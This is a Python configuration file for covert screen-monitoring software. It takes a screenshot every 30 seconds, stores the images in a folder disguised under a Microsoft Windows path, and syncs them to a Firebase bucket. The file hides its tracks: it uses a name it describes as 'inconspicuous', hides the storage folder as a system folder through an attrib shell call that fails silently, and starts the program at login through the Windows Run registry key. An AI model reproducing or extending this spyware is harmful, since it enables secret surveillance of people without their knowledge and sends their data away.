import os
from pathlib import Path

class Config:
    """Configuration settings for the monitoring application"""
    
    # Application name (inconspicuous)
    APP_NAME = "SystemHealthMonitor"
    
    # Screenshot settings
    SCREENSHOT_INTERVAL = 30  # seconds
    SCREENSHOT_QUALITY = 65  # JPEG quality (1-100)
    
    # Sync settings
    SYNC_INTERVAL = 600  # seconds (10 minutes)
    
    # Local storage settings
    # Hidden folder in AppData
    APPDATA = os.getenv('APPDATA')
    LOCAL_STORAGE_PATH = os.path.join(APPDATA, 'Microsoft', 'Windows', 'SystemData')
    SCREENSHOTS_FOLDER = os.path.join(LOCAL_STORAGE_PATH, 'screenshots')
    EVENTS_FOLDER = os.path.join(LOCAL_STORAGE_PATH, 'events')
    
    # Database
    DB_PATH = os.path.join(LOCAL_STORAGE_PATH, 'data.db')
    
    # Firebase settings
    FIREBASE_CREDENTIALS_PATH = os.path.join(LOCAL_STORAGE_PATH, 'creds.enc')
    FIREBASE_BUCKET_NAME = None  # Set this during setup
    
    # Log retention
    MAX_LOCAL_DAYS = 7  # Keep local data for 7 days before cleanup
    
    # Registry settings for auto-start
    REGISTRY_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
    REGISTRY_VALUE_NAME = APP_NAME
    
    @staticmethod
    def ensure_directories():
        """Create all necessary directories"""
        os.makedirs(Config.LOCAL_STORAGE_PATH, exist_ok=True)
        os.makedirs(Config.SCREENSHOTS_FOLDER, exist_ok=True)
        os.makedirs(Config.EVENTS_FOLDER, exist_ok=True)
        
        # Set folder as hidden and system
        try:
            os.system(f'attrib +h +s "{Config.LOCAL_STORAGE_PATH}"')
        except:
            pass  # Fail silently if can't set attributes
